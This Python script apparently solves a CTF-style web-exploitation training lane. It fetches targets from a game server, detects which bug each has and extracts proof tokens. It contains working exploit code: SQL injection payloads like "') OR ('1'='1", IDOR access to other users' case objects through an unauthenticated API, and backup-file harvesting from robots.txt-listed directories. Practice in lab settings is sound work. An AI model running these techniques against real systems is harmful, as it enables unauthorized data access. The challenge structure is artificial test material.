#!/usr/bin/env python3
"""Day 19 web-exploitation — unified lane solver (mastery is cumulative).

Mastery for a challenge on day D hands out one target PER SET drawn from the
lane's bug types up to day D (like mobile mixing earlier days' codecs):
  - backup-exposure : robots.txt -> open dir index -> *.json.bak with proof_<hex>
  - idor            : activity feed leaks a foreign case id -> object API (no authz)
  - sqli            : search form, group-closing boolean -> hidden `restricted` row

Each target is sniffed from its landing page and routed to the matching
recoverer, so one solver covers single/TT (one target) and mastery (N mixed
targets). Paced + timeouts, no fuzzing (shared-endpoint rule).

Usage: solve_lane.py solve <challenge-id>
       solve_lane.py start <challenge-id> [--run-for-time]
Env: HUNTRESS_GM_URL, HUNTRESS_GM_TOKEN.
"""
import argparse, json, os, re, shutil, sys, time, pathlib, urllib.parse
import requests

GM = os.environ["HUNTRESS_GM_URL"].rstrip("/")
TOK = os.environ["HUNTRESS_GM_TOKEN"]
RUN = pathlib.Path(__file__).resolve().parent / "run-mastery"
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")
DELAY = 0.8
SQLI_PAYLOADS = ["') OR ('1'='1", "%' OR '1'='1", "') OR ('1'='1'-- -", "' OR '1'='1"]


def gm(payload):
    r = requests.post(GM + "/", headers={"Authorization": "Bearer " + TOK,
                      "Content-Type": "application/json"}, json=payload, timeout=30)
    r.raise_for_status()
    return r.json()


def client(outdir):
    outdir.mkdir(parents=True, exist_ok=True)
    s = requests.Session(); s.headers["User-Agent"] = "ctf-web-lane/1.0"

    def get(base, path, save):
        r = s.get(base.rstrip("/") + path, timeout=20)
        (outdir / save).write_bytes(r.content)
        print(f"    GET {path} -> {r.status_code} {len(r.content)}B", file=sys.stderr)
        return r
    return s, get


# --- per-bug recoverers -----------------------------------------------------
def rec_sqli(base, get):
    root = get(base, "/", "root.html")
    m = re.search(r'<form[^>]*action=[\'"]([^\'"]+)[\'"]', root.text)
    action = m.group(1) if m else "/lookup"
    pm = re.search(r'<input[^>]*name=[\'"]([^\'"]+)[\'"]', root.text)
    param = pm.group(1) if pm else "q"
    for i, p in enumerate(SQLI_PAYLOADS):
        time.sleep(DELAY)
        r = get(base, action + "?" + urllib.parse.urlencode({param: p}), f"inject_{i}.html")
        mm = PROOF_RE.search(r.text)
        if mm:
            return mm.group(0)
    return None


def rec_idor(base, get):
    root = get(base, "/", "root.html")
    html = root.text
    feed = next(iter(re.findall(r'href="(/api/[^"]+)"', html)), None)
    case_links = re.findall(r'href="(/[a-z]+/\d+)"', html)
    my_ids = {int(l.rsplit("/", 1)[1]) for l in case_links}
    api_tmpl = None
    if case_links:
        time.sleep(DELAY)
        pg = get(base, case_links[0], "mycase.html")
        m = re.search(r'fetch\(["\'](/api/[^"\']*?)(\d+)([^"\']*)["\']', pg.text)
        if m:
            api_tmpl = (m.group(1), m.group(3))
    foreign = []
    if feed:
        time.sleep(DELAY)
        try:
            j = get(base, feed, "feed.json").json()
            me = j.get("current_user")
            for e in j.get("events", []):
                cid = e.get("case_id") or e.get("id")
                if cid is None:
                    continue
                if (e.get("owner") and e.get("owner") != me) or \
                   e.get("visibility") == "reference_only" or cid not in my_ids:
                    foreign.append(cid)
        except ValueError:
            pass

    def urls(cid):
        if api_tmpl:
            yield f"{api_tmpl[0]}{cid}{api_tmpl[1]}"
        for l in case_links[:1]:
            yield f"/api/{l.rsplit('/', 2)[-2]}/{cid}"
    for cid in dict.fromkeys(foreign):
        for u in dict.fromkeys(urls(cid)):
            time.sleep(DELAY)
            r = get(base, u, f"obj_{cid}.json")
            if r.status_code == 200:
                mm = PROOF_RE.search(r.text)
                if mm:
                    return mm.group(0)
                break
    return None


def rec_backup(base, get):
    rob = get(base, "/robots.txt", "robots.txt")
    for d in re.findall(r"(?mi)^\s*Disallow:\s*(\S+)", rob.text):
        d = "/" + d.strip("/") + "/"
        time.sleep(DELAY)
        idx = get(base, d, "index.html")
        if idx.status_code != 200:
            continue
        members = re.findall(r'href="([^"]+)"', idx.text)
        members.sort(key=lambda h: 0 if re.search(r"\.(bak|old|orig|save|swp|zip|tar|gz|sql|json)(\.|$)", h, re.I) else 1)
        for h in members:
            path = h if h.startswith("/") else d + h
            time.sleep(DELAY)
            r = get(base, path, path.strip("/").replace("/", "_"))
            if r.status_code == 200:
                mm = PROOF_RE.search(r.text)
                if mm:
                    return mm.group(0)
    return None


def recover(base, outdir):
    """Sniff the landing page and dispatch to the right recoverer."""
    s, get = client(outdir)
    root = get(base, "/", "root.html")
    html = root.text
    if re.search(r"<form[^>]*action", html):
        kind, fn = "sqli", rec_sqli
    elif re.search(r'href="/api/', html):
        kind, fn = "idor", rec_idor
    else:
        kind, fn = "backup", rec_backup
    print(f"  [{outdir.name}] sniffed bug = {kind}", file=sys.stderr)
    return fn(base, get)


def start(cid, rft=False):
    payload = {"op": "start", "challenge": cid}
    if rft: payload["run_for_time"] = True
    data = gm(payload)
    RUN.mkdir(parents=True, exist_ok=True)
    (RUN / "start.json").write_text(json.dumps(data, indent=2))
    return data


def solve(cid):
    data = start(cid)
    if data.get("result") == "preparing":
        print("attempt still preparing (targets not provisioned); re-run shortly"); sys.exit(3)
    targets = {t["id"]: t["url"] for t in data.get("targets", [])}
    if not targets:
        print("no targets:", json.dumps(data)[:300]); sys.exit(1)
    answers = {}
    for q in data["questions"]:
        url = targets.get(q.get("artifact"))
        if not url:
            print("no target for", q["id"], q.get("artifact")); continue
        outdir = RUN / re.sub(r"\W+", "_", q["artifact"])
        if outdir.exists():
            shutil.rmtree(outdir)          # avoid stale files from a prior variant
        proof = recover(url, outdir)
        print(f"  {q['id']} [{q['artifact']}] -> {proof}", file=sys.stderr)
        if proof:
            answers[q["id"]] = proof
    if len(answers) != len(data["questions"]):
        print("missing proofs, not submitting:", answers); sys.exit(2)
    res = gm({"op": "submit", "challenge": cid, "answers": answers})
    (RUN / "submit.json").write_text(json.dumps(res, indent=2))
    print(json.dumps({k: res.get(k) for k in ("result", "remaining", "accepted_ids", "flag")}))


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("cmd", choices=["start", "solve"])
    ap.add_argument("challenge")
    ap.add_argument("--run-for-time", action="store_true")
    a = ap.parse_args()
    if a.cmd == "start":
        print(json.dumps(start(a.challenge, a.run_for_time).get("targets"), indent=2))
    else:
        solve(a.challenge)
